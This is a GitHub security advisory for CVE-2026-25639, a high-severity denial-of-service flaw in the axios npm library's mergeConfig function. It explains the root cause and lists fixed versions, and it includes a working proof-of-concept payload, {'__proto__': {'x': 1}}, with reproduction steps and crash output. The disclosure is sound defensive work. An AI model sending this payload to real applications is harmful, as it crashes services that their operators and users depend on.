# [H] Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig

## Summary
Severity: High
Advisory: GHSA-43fc-jf86-j433
CVE: CVE-2026-25639
CWE: CWE-1321, CWE-754
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-43fc-jf86-j433
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.13.5
- npm: `axios` — affected >=0 <0.30.3

## Details
# Denial of Service via **proto** Key in mergeConfig

### Summary

The `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.

### Details

The vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:

```javascript
utils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {
  const merge = mergeMap[prop] || mergeDeepProperties;
  const configValue = merge(config1[prop], config2[prop], prop);
  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);
});
```

When `prop` is `'__proto__'`:

1. `JSON.parse('{"__proto__": {...}}')` creates an object with `__proto__` as an own enumerable property
2. `Object.keys()` includes `'__proto__'` in the iteration
3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)
4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`
5. `Object.prototype(...)` throws `TypeError: merge is not a function`

The `mergeConfig` function is called by:

- `Axios._request()` at `lib/core/Axios.js:75`
- `Axios.getUri()` at `lib/core/Axios.js:201`
- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`

### PoC

```javascript
import axios from "axios";

const maliciousConfig = JSON.parse('{"__proto__": {"x": 1}}');
await axios.get("https://httpbin.org/get", maliciousConfig);
```

**Reproduction steps:**

1. Clone axios repository or `npm install axios`
2. Create file `poc.mjs` with the code above
3. Run: `node poc.mjs`
4. Observe the TypeError crash

**Verified output (axios 1.13.4):**

```
TypeError: merge is not a function
    at computeConfigValue (lib/core/mergeConfig.js:100:25)
    at Object.forEach (lib/utils.js:280:10)
    at mergeConfig (lib/core/mergeConfig.js:98:9)
```

**Control tests performed:**
| Test | Config | Result |
|------|--------|--------|
| Normal config | `{"timeout": 5000}` | SUCCESS |
| Malicious config | `JSON.parse('{"__proto__": {"x": 1}}')` | **CRASH** |
| Nested object | `{"headers": {"X-Test": "value"}}` | SUCCESS |

**Attack scenario:**
An application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{"__proto__": {"x": 1}}`.

### Impact

**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.

Affected environments:

- Node.js servers using axios for HTTP requests
- Any backend that passes parsed JSON to axios configuration

This is NOT prototype pollution - the application crashes before any assignment occurs.

## References
- https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433
- https://nvd.nist.gov/vuln/detail/CVE-2026-25639
- https://github.com/axios/axios/pull/7369
- https://github.com/axios/axios/pull/7388
- https://github.com/axios/axios/commit/28c721588c7a77e7503d0a434e016f852c597b57
- https://github.com/axios/axios/commit/d7ff1409c68168d3057fc3891f911b2b92616f9e
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v0.30.3
- https://github.com/axios/axios/releases/tag/v1.13.5
